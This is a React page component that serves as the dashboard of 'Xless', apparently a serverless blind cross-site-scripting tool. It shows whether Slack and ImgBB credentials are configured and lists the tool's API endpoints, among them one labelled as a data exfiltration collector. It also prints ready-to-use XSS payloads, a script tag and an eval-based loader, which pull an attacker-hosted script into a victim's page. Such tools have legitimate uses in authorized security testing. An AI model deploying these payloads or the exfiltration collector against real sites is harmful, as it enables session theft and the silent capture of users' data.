import React from 'react';

export default function Home() {
  const slackSet = !!process.env.SLACK_INCOMING_WEBHOOK;
  const imgbbSet = !!process.env.IMGBB_API_KEY;

  return (
    <main>
      <h1>Xless Dashboard</h1>
      <p>The Serverless Blind XSS App (Next.js Edition)</p>

      <section>
        <h2>Status</h2>
        <div>
          Slack Webhook: {' '}
          <span className={`status-badge ${slackSet ? 'status-ok' : 'status-missing'}`}>
            {slackSet ? 'Configured' : 'Missing'}
          </span>
        </div>
        <div style={{ marginTop: '10px' }}>
          ImgBB API Key: {' '}
          <span className={`status-badge ${imgbbSet ? 'status-ok' : 'status-missing'}`}>
            {imgbbSet ? 'Configured' : 'Optional / Missing'}
          </span>
        </div>
      </section>

      <section>
        <h2>Payload Examples</h2>
        <p>Use any path under <code>/api/</code> to trigger an Out-of-Band alert and load the XSS payload.</p>
        
        <h3>Basic Script Tag</h3>
        <pre><code>{`<script src="/api/x"></script>`}</code></pre>

        <h3>Advanced Loader</h3>
        <pre><code>{`javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'/api/x\\';document.body.appendChild(a)')`}</code></pre>
      </section>

      <section>
        <h2>Endpoints</h2>
        <ul>
          <li><code>/api/health</code> - Check system health</li>
          <li><code>/api/c</code> - Data exfiltration (POST)</li>
          <li><code>/api/message?text=Hello</code> - Manual Slack message</li>
          <li><code>/api/examples</code> - Text-based payload examples</li>
        </ul>
      </section>

      <section style={{ marginTop: '40px', fontSize: '0.8em', color: '#666' }}>
        <p>Remember to set <code>SLACK_INCOMING_WEBHOOK</code> and <code>IMGBB_API_KEY</code> in your environment variables.</p>
      </section>
    </main>
  );
}
